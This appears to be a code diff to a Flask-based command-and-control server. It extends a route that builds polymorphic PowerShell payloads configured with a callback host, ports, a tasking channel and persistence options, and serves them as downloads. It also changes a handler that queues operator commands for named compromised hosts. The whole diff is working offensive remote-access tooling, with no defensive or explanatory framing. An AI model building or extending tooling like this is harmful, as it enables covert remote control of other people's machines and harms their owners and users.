@@ -488,14 +488,35 @@ def upload():
 
     return render_template("upload.html")
 
-@app.route('/generate_ps_payload', methods=['GET'])
+@app.route('/generate_ps_payload', methods=['GET', 'POST'])
 @login_required
 def generate_ps_payload():
     from tools.ps_builder import generate_polymorphic_ps
-    filename = generate_polymorphic_ps()
-    return send_from_directory('payloads', filename)
+    import os
 
-browse_results = {}
+    if request.method == 'POST':
+        host = request.form.get('host') or request.host.split(':')[0]
+        port = int(request.form.get('port') or 1443)
+        http_port = int(request.form.get('http_port') or 8080)
+
+        filename = generate_polymorphic_ps(
+            host=host,
+            port=port,
+            http_port=http_port,
+            http_tasker=True,
+            xor_encrypt=False,
+            auto_recon=False,
+            persistence='none',
+            write_file=True
+        )
+
+        return send_from_directory(
+            directory=os.path.abspath("server/payloads"),
+            path=filename,
+            as_attachment=True
+        )
+
+    return render_template('generate_ps.html')
 
 @app.route('/api/browse', methods=['POST'])
 def browse_task():
@@ -666,11 +687,22 @@ def console_ps_data():
 def handle_ps_command(data):
     hostname = data.get('hostname')
     command = data.get('command')
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute("INSERT INTO tasks (hostname, command, status) VALUES (?, ?, 'pending')", (hostname, command))
-    conn.commit()
-    conn.close()
+
+    if not hostname or not command:
+        print("[!] Missing hostname or command in ps_command")
+        return
+
+    print(f"[+] PS command received: {hostname} -> {command}")
+
+    try:
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute("INSERT INTO tasks (hostname, command, status) VALUES (?, ?, 'pending')", (hostname, command))
+        conn.commit()
+        conn.close()
+        print("[+] Task inserted successfully into DB")
+    except Exception as e:
+        print(f"[!] Failed to insert task: {e}")
 
 def emit_ps_result(hostname, output):
     socketio.emit('ps_output', {
